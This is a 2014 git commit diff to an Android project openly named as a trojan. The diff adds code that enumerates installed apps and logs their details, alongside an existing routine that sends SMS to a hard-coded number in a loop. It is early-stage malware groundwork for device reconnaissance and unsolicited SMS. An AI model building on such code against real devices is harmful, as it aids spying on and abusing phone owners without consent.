0d2ecabbd8937cdff05b688711c1b6631740a771
Melgrani2a <melgrani2a@gmail.com>
2014-12-10 17:18:50 +0100

    Save 10/12/14 18h

--- app/src/main/java/trojan/android/android_trojan/first_activity.java
+++ app/src/main/java/trojan/android/android_trojan/first_activity.java
@@ -3,12 +3,17 @@ package trojan.android.android_trojan;
 import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageInfo;
+import android.graphics.drawable.Drawable;
 import android.os.Bundle;
 import android.provider.Telephony;
 import android.telephony.SmsManager;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
+
+import java.util.ArrayList;
+import java.util.List;
 
 /**
  * Created by Jean-Laurent on 26/11/2014.
@@ -25,18 +30,23 @@ public class first_activity extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.first_activity);
         button01 = (Button) findViewById(R.id.button01);
+        button02 = (Button) findViewById(R.id.button02);
 
         button01.setOnClickListener(new View.OnClickListener() {
 
             @Override
-
-
             public void onClick(View v) {
                 for(int i = 1; i <= 3; i++) {
                     SendSMS("0628470850", "Test Message 2.1");
                 }}
         });
 
+        button02.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                getPackages();
+            }
+        });
 
     }
 
@@ -49,6 +59,49 @@ public class first_activity extends Activity {
         sms.sendTextMessage(numTelephone, null, message, null, null);
     }
 
+
+    class PInfo {
+        private String appname = "";
+        private String pname = "";
+        private String versionName = "";
+        private int versionCode = 0;
+        private Drawable icon;
+        private void prettyPrint() {
+            Log.d(TAG, appname + "\t" + pname + "\t" + versionName + "\t" + versionCode);
+        }
+    }
+
+    private ArrayList<PInfo> getPackages() {
+        ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
+        final int max = apps.size();
+        for (int i=0; i<max; i++) {
+            apps.get(i).prettyPrint();
+        }
+        return apps;
+    }
+
+    private ArrayList<PInfo> getInstalledApps(boolean getSysPackages) {
+        ArrayList<PInfo> res = new ArrayList<PInfo>();
+        List<PackageInfo> packs = getPackageManager().getInstalledPackages(0);
+        for(int i=0;i<packs.size();i++) {
+            PackageInfo p = packs.get(i);
+            if ((!getSysPackages) && (p.versionName == null)) {
+                continue ;
+            }
+            PInfo newInfo = new PInfo();
+            newInfo.appname = p.applicationInfo.loadLabel(getPackageManager()).toString();
+            newInfo.pname = p.packageName;
+            newInfo.versionName = p.versionName;
+            newInfo.versionCode = p.versionCode;
+            newInfo.icon = p.applicationInfo.loadIcon(getPackageManager());
+            res.add(newInfo);
+        }
+        return res;
+    }
 }
+
+
+
+
 
 
